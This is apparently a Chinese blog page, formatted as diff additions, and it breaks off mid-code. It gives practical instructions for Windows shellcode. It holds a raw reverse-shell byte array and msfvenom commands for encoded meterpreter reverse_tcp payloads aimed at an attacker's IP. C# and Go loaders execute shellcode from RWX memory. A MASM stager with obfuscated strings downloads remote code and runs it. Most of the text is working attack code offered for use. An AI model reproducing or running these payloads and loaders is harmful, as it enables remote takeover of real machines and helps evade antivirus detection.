+<h2 id="C-语言ShellCode"><a href="#C-语言ShellCode" class="headerlink" title="C#语言ShellCode"></a>C#语言ShellCode</h2><h3 id="msf生成ShellCode-4"><a href="#msf生成ShellCode-4" class="headerlink" title="msf生成ShellCode"></a>msf生成ShellCode</h3><ul>
+<li>生成的结果形如</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">byte[] buf = new byte[510] &#123;0xfc,0x48,0x83,0xe4,0xf0,0xe8,</span><br><span class="line">0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,</span><br><span class="line">0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x48,0x8b,</span><br><span class="line">0x52,0x20,0x56,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,</span><br><span class="line">0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,</span><br><span class="line">0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,</span><br><span class="line">0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,</span><br><span class="line">0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,</span><br><span class="line">0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,</span><br><span class="line">0xd0,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0x8b,0x48,0x18,</span><br><span class="line">0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,</span><br><span class="line">0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,</span><br><span class="line">0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,</span><br><span class="line">0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,</span><br><span class="line">0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,</span><br><span class="line">0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x5e,0x59,0x48,0x01,</span><br><span class="line">0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,</span><br><span class="line">0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,</span><br><span class="line">0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,</span><br><span class="line">0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,</span><br><span class="line">0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x90,</span><br><span class="line">0x7f,0x00,0x00,0x01,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,</span><br><span class="line">0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,</span><br><span class="line">0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,</span><br><span class="line">0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,</span><br><span class="line">0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,</span><br><span class="line">0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,</span><br><span class="line">0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,</span><br><span class="line">0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,</span><br><span class="line">0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,</span><br><span class="line">0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,</span><br><span class="line">0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,</span><br><span class="line">0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,</span><br><span class="line">0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,</span><br><span class="line">0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,</span><br><span class="line">0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,</span><br><span class="line">0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,</span><br><span class="line">0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,</span><br><span class="line">0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,</span><br><span class="line">0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,</span><br><span class="line">0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,</span><br><span class="line">0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,</span><br><span class="line">0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x86-6"><a href="#Windows-x86-6" class="headerlink" title="Windows x86"></a>Windows x86</h4><blockquote>
+<p><code>&lt;ip_remote&gt;</code>：攻击者IP地址<br><code>&lt;port_remote&gt;</code>：攻击者监听的端口号<br><code>-o x.c</code>：输出为文件</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -f csharp -e x86/shikata_ga_nai -i 15</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-x64-7"><a href="#Windows-x64-7" class="headerlink" title="Windows x64"></a>Windows x64</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ip_remote&gt; LPORT=&lt;port_remote&gt; -f csharp x64/shikata_ga_nai -i 15</span><br></pre></td></tr></table></figure>
+
+<h3 id="针对于Windows的ShellCode执行器-1"><a href="#针对于Windows的ShellCode执行器-1" class="headerlink" title="针对于Windows的ShellCode执行器"></a>针对于Windows的ShellCode执行器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace Project</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr GetModuleHandle(string moduleName);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 LoadLibrary(string lpFileName);</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetLastError();</span><br><span class="line">        </span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] buf = new byte[] &#123; 0x00, 0x00, 0x00, 0x00 &#125;;</span><br><span class="line"></span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Go语言ShellCode"><a href="#Go语言ShellCode" class="headerlink" title="Go语言ShellCode"></a>Go语言ShellCode</h2><ul>
+<li>Go语言加载C语言ShellCode</li>
+</ul>
+<h3 id="生成C语言的ShellCode"><a href="#生成C语言的ShellCode" class="headerlink" title="生成C语言的ShellCode"></a>生成C语言的ShellCode</h3><p><a href="#C%E8%AF%AD%E8%A8%80ShellCode">传送门</a></p>
+<h3 id="针对于Windows的ShellCode执行器-2"><a href="#针对于Windows的ShellCode执行器-2" class="headerlink" title="针对于Windows的ShellCode执行器"></a>针对于Windows的ShellCode执行器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkErr</span><span class="params">(err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">			<span class="built_in">println</span>(err.Error())</span><br><span class="line">			os.Exit(<span class="number">1</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> buf []<span class="type">byte</span> = []<span class="type">byte</span>&#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(os.Args) &gt; <span class="number">1</span> &#123;</span><br><span class="line">		bufFromFileData, err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line">		checkErr(err)</span><br><span class="line">		buf = bufFromFileData</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> addr == <span class="number">0</span> &#123;</span><br><span class="line">		checkErr(err)</span><br><span class="line">	&#125;</span><br><span class="line">	_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;buf[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(buf)))</span><br><span class="line">	checkErr(err)</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="汇编语言ShellCode"><a href="#汇编语言ShellCode" class="headerlink" title="汇编语言ShellCode"></a>汇编语言ShellCode</h2><h3 id="针对于Windows的ShellCode执行器-3"><a href="#针对于Windows的ShellCode执行器-3" class="headerlink" title="针对于Windows的ShellCode执行器"></a>针对于Windows的ShellCode执行器</h3><h4 id="HTTP协议的ShellCode执行器"><a href="#HTTP协议的ShellCode执行器" class="headerlink" title="HTTP协议的ShellCode执行器"></a>HTTP协议的ShellCode执行器</h4><blockquote>
+<p><code>50h</code>：定义端口号，十六进制的50等于十进制的80<br><code>37h,2dh,37h,2dh,37h,2dh,37h,2dh</code>：定义IP地址，在ASCII码中，十六进制的2e表示<code>.</code>，而十六进制的2d是<code>.</code>的前一个字符，也就是所有字符都偏移-1，在这段代码中使用十六进制的2d来表示<code>.</code></p>
+</blockquote>
+<figure class="highlight plaintext"><figcaption><span>masm.asm</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">; win.asm</span><br><span class="line">.386</span><br><span class="line">.MODEL flat</span><br><span class="line">.STACK</span><br><span class="line">.DATA</span><br><span class="line">Point0 db 4 dup(0)        ; GetProcAddress</span><br><span class="line">Point1 db 4 dup(0)        ; VirtualAlloc</span><br><span class="line">Point2 db 4 dup(0)</span><br><span class="line">Point3 db 4 dup(0)</span><br><span class="line">Point4 db 4 dup(0)        ; InternetOpenA</span><br><span class="line">Point5 db 4 dup(0)        ; InternetConnectA</span><br><span class="line">Point6 db 4 dup(0)        ; HttpOpenRequestA</span><br><span class="line">Point7 db 4 dup(0)        ; HttpSendRequestA</span><br><span class="line">Point8 db 4 dup(0)        ; InternetReadFile</span><br><span class="line"></span><br><span class="line">Point0_dll db 4 dup(0)    ; kernel32.dll</span><br><span class="line">Point1_dll db 4 dup(0)    ; wininet.dll</span><br><span class="line"></span><br><span class="line">Dll1 db 76h,68h,6dh,68h,6dh,64h,73h,2dh,63h,6bh,6bh,00h                      ; wininet.dll</span><br><span class="line"></span><br><span class="line">func1 db 55h,68h,71h,73h,74h,60h,6bh,40h,6bh,6bh,6eh,62h,00h                 ; VirtualAlloc</span><br><span class="line">func3 db 4bh,6eh,60h,63h,4bh,68h,61h,71h,60h,71h,78h,40h,00h                 ; LoadLibraryA</span><br><span class="line">func4 db 48h,6dh,73h,64h,71h,6dh,64h,73h,4eh,6fh,64h,6dh,40h,00h             ; InternetOpenA</span><br><span class="line">func5 db 48h,6dh,73h,64h,71h,6dh,64h,73h,42h,6eh,6dh,6dh,64h,62h,73h,40h,00h ; InternetConnectA</span><br><span class="line">func6 db 47h,73h,73h,6fh,4eh,6fh,64h,6dh,51h,64h,70h,74h,64h,72h,73h,40h,00h ; HttpOpenRequestA</span><br><span class="line">func7 db 47h,73h,73h,6fh,52h,64h,6dh,63h,51h,64h,70h,74h,64h,72h,73h,40h,00h ; HttpSendRequestA</span><br><span class="line">func8 db 48h,6dh,73h,64h,71h,6dh,64h,73h,51h,64h,60h,63h,45h,68h,6bh,64h,00h ; InternetReadFile</span><br><span class="line"></span><br><span class="line">func4_param db &quot;aa&quot;</span><br><span class="line">func5_param db 37h,2dh,37h,2dh,37h,2dh,37h,2dh ; IP Address</span><br><span class="line">func6_param0 db &quot;HTTP/100&quot;,00h</span><br><span class="line">func6_param1 db &quot;/5quA&quot;,00h</span><br><span class="line">func6_param2 db &quot;GET&quot;,00</span><br><span class="line"></span><br><span class="line">.CODE</span><br><span class="line">ASSUME FS:NOTHING</span><br><span class="line">_START:</span><br><span class="line">    call Getkernel32DLL</span><br><span class="line">    mov DWORD PTR [Point0_dll], ebx</span><br><span class="line">    call Get_Function</span><br><span class="line">    mov DWORD PTR [Point0],edx</span><br><span class="line">    push offset DWORD PTR func3</span><br><span class="line">    call Decode</span><br><span class="line">    push offset DWORD PTR Dll1</span><br><span class="line">    call Decode</span><br><span class="line">    mov eax,DWORD PTR [Point0_dll]</span><br><span class="line">    push offset DWORD PTR func3</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point0]</span><br><span class="line">    push offset DWORD PTR Dll1</span><br><span class="line">    call eax            ;call LoadLibraryA  </span><br><span class="line">    mov DWORD PTR [Point1_dll], eax</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR func4             </span><br><span class="line">    call Decode</span><br><span class="line">    mov eax, DWORD PTR [Point1_dll]</span><br><span class="line">    push offset DWORD PTR func4</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point0]</span><br><span class="line">    mov DWORD PTR [Point4], eax</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR func5</span><br><span class="line">    call Decode</span><br><span class="line">    mov eax, DWORD PTR [Point1_dll]</span><br><span class="line">    push offset DWORD PTR func5</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point0]</span><br><span class="line">    mov DWORD PTR [Point5], eax</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR func6</span><br><span class="line">    call Decode</span><br><span class="line">    mov eax, DWORD PTR [Point1_dll]</span><br><span class="line">    push offset DWORD PTR func6</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point0]</span><br><span class="line">    mov DWORD PTR [Point6], eax</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR func7</span><br><span class="line">    call Decode</span><br><span class="line">    mov eax, DWORD PTR [Point1_dll]</span><br><span class="line">    push offset DWORD PTR func7</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point0]</span><br><span class="line">    mov DWORD PTR [Point7], eax</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR func1</span><br><span class="line">    call Decode</span><br><span class="line">    mov eax, DWORD PTR [Point0_dll]</span><br><span class="line">    push offset DWORD PTR func1</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point0]</span><br><span class="line">    mov DWORD PTR [Point1], eax</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR func8</span><br><span class="line">    call Decode</span><br><span class="line">    mov eax, DWORD PTR [Point1_dll]</span><br><span class="line">    push offset DWORD PTR func8</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point0]</span><br><span class="line">    mov DWORD PTR [Point8], eax</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR func5_param</span><br><span class="line">    call Decode</span><br><span class="line"></span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 1</span><br><span class="line">    push offset DWORD PTR func4_param</span><br><span class="line">    call DWORD PTR [Point4]</span><br><span class="line"></span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 3</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 50h ; Port</span><br><span class="line">    push offset DWORD PTR func5_param</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point5]</span><br><span class="line"></span><br><span class="line">    push 0</span><br><span class="line">    push 4000000h</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push offset DWORD PTR func6_param0</span><br><span class="line">    push offset DWORD PTR func6_param1</span><br><span class="line">    push offset DWORD PTR func6_param2</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point6]</span><br><span class="line">    mov DWORD PTR [Point2],eax</span><br><span class="line"></span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push 0</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point7]</span><br><span class="line"></span><br><span class="line">    push 40h</span><br><span class="line">    push 1000h</span><br><span class="line">    push 400000h</span><br><span class="line">    push 0</span><br><span class="line">    call DWORD PTR [Point1]</span><br><span class="line"></span><br><span class="line">    push offset DWORD PTR Point3</span><br><span class="line">    push 400000h</span><br><span class="line">    push eax</span><br><span class="line">    mov edi,eax</span><br><span class="line">    mov eax,DWORD PTR [Point2]</span><br><span class="line">    push eax</span><br><span class="line">    call DWORD PTR [Point8]</span><br><span class="line">    push edi</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">Getkernel32DLL:</span><br><span class="line">  xor ecx,ecx</span><br><span class="line">  mov 